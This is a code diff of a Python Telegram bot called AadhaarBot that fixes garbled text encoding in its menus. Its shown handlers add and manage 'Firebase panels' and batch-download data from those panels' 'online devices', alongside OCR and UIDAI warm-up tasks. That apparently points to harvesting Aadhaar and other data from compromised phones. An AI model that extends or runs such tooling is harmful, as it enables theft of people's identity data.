-                    f"<b>{emo('Ã°ÂÂÂ¥')} sÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ({page+1}/{total_pages})</b>\n\n"
+                    f"<b>{emo('🔥')} sᴇʟᴇᴄᴛ ʏᴏᴜʀ ꜰɪʀᴇʙᴀsᴇ ({page+1}/{total_pages})</b>\n\n"
                     "<blockquote>"
-                    "<b>Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂÃ¡Â´ÂÃ¡Â´Â.</b>"
+                    "<b>ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ꜰɪʀᴇʙᴀsᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ꜰʀᴏᴍ.</b>"
                     "</blockquote>"
                 )
             try:
@@ -5061,20 +5023,20 @@ class AadhaarBot:
             fb_id = query.data.replace('fb_sel_', '')
             fb = get_firebase_by_id(fb_id, user_id=None if is_admin(uid) else uid)
             if not fb:
-                await query.answer("Ã¢ÂÂ Firebase not found!", show_alert=True)
+                await query.answer("❌ Firebase not found!", show_alert=True)
                 return
             if self.active_batches.get(uid):
-                await query.answer("Ã¢ÂÂ Ã¯Â¸Â Batch download already running! Send /cancel to stop.", show_alert=True)
+                await query.answer("⚠️ Batch download already running! Send /cancel to stop.", show_alert=True)
                 return
 
             self.update_user_data(uid, 'selected_firebase_id', fb['id'])
             self.update_user_data(uid, 'selected_firebase_name', fb['name'])
             self.update_user_data(uid, 'selected_firebase_url', fb['url'])
             self.update_user_data(uid, 'selected_firebase_key', fb.get('key', ''))
-            await query.answer(f"Ã¢ÂÂ¡ [{fb['name']}] ke online devices fetch aur download shuru...")
+            await query.answer(f"⚡ [{fb['name']}] ke online devices fetch aur download shuru...")
 
             loading_msg = await query.message.reply_text(
-                f"<b>{emo('Ã¢ÂÂ³')} ÃªÂÂ°Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ´ÃÂÃÂªÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Âs ÃªÂÂ°ÃÂÃ¡Â´ÂÃ¡Â´Â {html.escape(str(fb['name']))}...</b>",
+                f"<b>{emo('⏳')} ꜰᴇᴛᴄʜɪɴɢ ᴀʟʟ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇs ꜰʀᴏᴍ {html.escape(str(fb['name']))}...</b>",
                 parse_mode='HTML'
             )
             devices = await asyncio.to_thread(
@@ -5083,15 +5045,15 @@ class AadhaarBot:
             )
             if not devices:
                 await loading_msg.edit_text(
-                    f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃÂª Ã¡Â´ÂÃÂ´ÃÂÃÂªÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃÂÃÂª Ã¡Â´ÂÃÂªÃÂÃ¡Â´Â</b>\n\n"
+                    f"<b>{emo('❌')} ᴋᴏɪ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇ ɴᴀʜɪ ᴍɪʟᴀ</b>\n\n"
                     f"<blockquote><b>[{html.escape(str(fb['name']))}] Firebase panel me abhi koi device online nahi hai.</b></blockquote>",
                     reply_markup=InlineKeyboardMarkup([
                         [
-                            InlineKeyboardButton("ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ", callback_data=f"fb_sel_{fb_id}", style="primary"),
-                            InlineKeyboardButton("ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â", callback_data='fb_download_all_panels', style="primary"),
+                            InlineKeyboardButton("ʀᴇᴛʀʏ", callback_data=f"fb_sel_{fb_id}", style="primary"),
+                            InlineKeyboardButton("ʙᴀᴄᴋ", callback_data='fb_download_all_panels', style="primary"),
                         ],
                         [
-                            InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â", callback_data='back_menu', style="primary")
+                            InlineKeyboardButton("ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data='back_menu', style="primary")
                         ]
                     ]),
                     parse_mode='HTML'
@@ -5120,26 +5082,26 @@ class AadhaarBot:
             if uid == target_uid or is_admin(uid):
                 if self.active_batches.get(target_uid):
                     self.active_batches[target_uid]['cancel'] = True
-                    await query.answer("Ã°ÂÂÂ Cancelling batch download...", show_alert=True)
+                    await query.answer("🛑 Cancelling batch download...", show_alert=True)
                 else:
                     await query.answer("Batch already finished or not active.", show_alert=True)
             else:
-                await query.answer("Ã¢ÂÂ Unauthorized!", show_alert=True)
+                await query.answer("❌ Unauthorized!", show_alert=True)
 
         # ============================================
-        # USER FIREBASE Ã¢ÂÂ Add / Manage
+        # USER FIREBASE — Add / Manage
         # ============================================
         elif query.data == 'user_add_fb':
             self.update_user_data(uid, 'awaiting_firebase_add', 'name')
             cancel_kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ", callback_data="cancel_firebase_add", style="danger")]
+                [InlineKeyboardButton("ᴄᴀɴᴄᴇʟ", callback_data="cancel_firebase_add", style="danger")]
             ])
             await query.message.reply_text(
-                f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â</b>\n\n"
+                f"<b>{emo('🔥')} ᴀᴅᴅ ʏᴏᴜʀ ꜰɪʀᴇʙᴀsᴇ</b>\n\n"
                 "<blockquote>"
-                "<b>sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 1:</b> Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â\n"
-                "<i>(Ã¡Â´Â.ÃÂ¢. Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ, ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ, Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ1)</i>\n\n"
-                "<b>Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ:</b> Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´ ÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃÂ sÃ¡Â´ÂÃÂ´Ã¡Â´Â /cancel"
+                "<b>sᴛᴇᴘ 1:</b> ᴇɴᴛᴇʀ ʏᴏᴜʀ ꜰɪʀᴇʙᴀsᴇ ɴᴀᴍᴇ\n"
+                "<i>(ᴇ.ɢ. ᴍʏᴘᴀɴᴇʟ, ʀᴀᴍᴘᴀɴᴇʟ, ᴘᴀɴᴇʟ1)</i>\n\n"
+                "<b>ᴄᴀɴᴄᴇʟ:</b> ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴏʀ sᴇɴᴅ /cancel"
                 "</blockquote>",
                 reply_markup=cancel_kb,
                 parse_mode='HTML'
@@ -5148,7 +5110,7 @@ class AadhaarBot:
         elif query.data == 'cancel_firebase_add':
             self.update_user_data(uid, 'awaiting_firebase_add', None)
             self.update_user_data(uid, 'fb_adding_name', None)
-            await query.answer("Ã¢ÂÂ Firebase add cancel kar diya gaya.")
+            await query.answer("❌ Firebase add cancel kar diya gaya.")
             try:
                 await query.message.delete()
             except Exception:
@@ -5178,7 +5140,7 @@ class AadhaarBot:
             page = max(0, min(page, total_pages - 1))
             kb = self.get_manage_firebase_keyboard(uid, page=page)
             text = (
-                f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ¢Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ({page+1}/{total_pages})</b>\n\n"
+                f"<b>{emo('🔥')} ᴀᴘɴᴇ ꜰɪʀᴇʙᴀꜱᴇ ᴍᴀɴᴀɢᴇ ᴋᴀʀᴏ ({page+1}/{total_pages})</b>\n\n"
                 "<blockquote><b>Delete karne ke liye button press karo:</b></blockquote>"
             )
             try:
@@ -5199,16 +5161,16 @@ class AadhaarBot:
                 page = 0
 
             await asyncio.to_thread(delete_firebase, fb_id, uid)
-            await query.answer("Ã¢ÂÂ Firebase delete ho gaya!", show_alert=True)
+            await query.answer("✅ Firebase delete ho gaya!", show_alert=True)
             # Refresh list
             fbs = await asyncio.to_thread(get_all_firebases, uid)
             if not fbs:
                 await safe_edit_text(
                     query.message,
-                    f"<b>{emo('Ã¢ÂÂ')} Saare Firebase delete ho gaye.</b>",
+                    f"<b>{emo('✅')} Saare Firebase delete ho gaye.</b>",
                     reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â", callback_data="user_add_fb", style="success")],
-                        [InlineKeyboardButton("ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â", callback_data='fb_download_all_panels', style="primary")]
+                        [InlineKeyboardButton("ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ", callback_data="user_add_fb", style="success")],
+                        [InlineKeyboardButton("ʙᴀᴄᴋ", callback_data='fb_download_all_panels', style="primary")]
                     ]),
                     parse_mode='HTML'
                 )
@@ -5217,7 +5179,7 @@ class AadhaarBot:
                 page = max(0, min(page, total_pages - 1))
                 kb = self.get_manage_firebase_keyboard(uid, page=page)
                 text = (
-                    f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ¢Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ({page+1}/{total_pages})</b>\n\n"
+                    f"<b>{emo('🔥')} ᴀᴘɴᴇ ꜰɪʀᴇʙᴀꜱᴇ ᴍᴀɴᴀɢᴇ ᴋᴀʀᴏ ({page+1}/{total_pages})</b>\n\n"
                     "<blockquote><b>Delete karne ke liye button press karo:</b></blockquote>"
                 )
                 try:
@@ -5253,7 +5215,7 @@ def main():
             _ocr_classify(dummy)
             if _ocr_beta:
                 _ocr_classify_beta(dummy)
-            logger.info("Ã¢ÂÂ¡ OCR engine pre-warmed for 0ms cold-start")
+            logger.info("⚡ OCR engine pre-warmed for 0ms cold-start")
         except Exception:
             pass
 
@@ -5261,7 +5223,7 @@ def main():
         loop = asyncio.get_running_loop()
         executor = ThreadPoolExecutor(max_workers=100, thread_name_prefix="BotPool")
         loop.set_default_executor(executor)
-        logger.info("Ã¢ÂÂ¡ Custom ThreadPoolExecutor initialized with 100 workers for non-blocking multi-user concurrency")
+        logger.info("⚡ Custom ThreadPoolExecutor initialized with 100 workers for non-blocking multi-user concurrency")
         asyncio.create_task(_keep_uidai_warm())
         asyncio.create_task(_warmup_ocr())
 
@@ -5344,11 +5306,11 @@ if __name__ == "__main__":
     try:
         import uvloop
         uvloop.install()
-        logger.info("Ã¢ÂÂ¡ Ultra-fast uvloop event loop active")
+        logger.info("⚡ Ultra-fast uvloop event loop active")
     except Exception as e:
         logger.warning(f"uvloop not loaded: {e}")
     try:
         main()
     except KeyboardInterrupt:
-        print("\nÃ¢ÂÂ Stopped")
+        print("\n❌ Stopped")
         sys.exit()
